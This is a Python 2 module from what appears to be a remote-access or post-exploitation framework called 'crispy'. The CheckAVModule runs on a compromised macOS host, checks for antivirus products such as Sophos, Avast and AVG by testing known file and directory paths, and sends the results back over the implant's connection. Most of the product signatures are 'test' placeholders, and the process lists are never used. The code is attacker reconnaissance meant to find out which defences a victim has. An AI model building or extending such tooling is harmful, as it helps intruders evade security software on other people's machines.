import cPickle
import logging

from crispy.lib.module import *
from crispy.lib.fprint import *

logger = logging.getLogger(__name__)

__class_name__ = "CheckAVModule"
class CheckAVModule(CrispyModule):
    """ Determine if and which (if any) AV is on a remote machine. """

    compatible_systems = ['darwin']

    def marshall_me(self):
        import os
       
        avast = {'name':'Avast', 'files':['test'], 'dirs':['test'], 'procs':[]}
        avg = {'name':'AVG', 'files':['test'], 'dirs':['test'], 'procs':[]}
        bitdefender = {'name':'Bit Defender', 'files':['test'], 'dirs':['test'], 'procs':[]}
        comodo = {'name':'Comodo', 'files':['test'], 'dirs':['test'], 'procs':[]}
        sophos = {'name':'Sophos AV', 
                'files':['/usr/local/bin/sweep'], 
                'dirs':['/Applications/Sophos Anti-Virus.app'], 
                'procs':['SophosScanD', 'SophosWebIntelligence']}
        av_list = [avast, avg, bitdefender, comodo, sophos]

        info = "\n"
        for av in av_list:
            fCount = dCount = pCount = 0
            for sf in av['files']:
                if os.path.isfile(sf):
                    fCount += 1
            for sd in av['dirs']:
                if os.path.isdir(sd):
                    dCount += 1
            
            div = float(len(av['files'])) + float(len(av['dirs']))
            info += "{} = {}%\n".format(av['name'], (fCount/div + dCount/div)*100) 
        return info

    def run(self, args):
	logger.debug("in checkav run()")
        info("Determining probability of the below AntiVirus software.")
        
        try:
            data = cPickle.dumps(self.marshall_me(), -1)
            self.client.conn.sendall(data)
            print "{}".format(self.client.conn.recv(1024))
            success("Done.")
        except Exception as e:
            error(e)
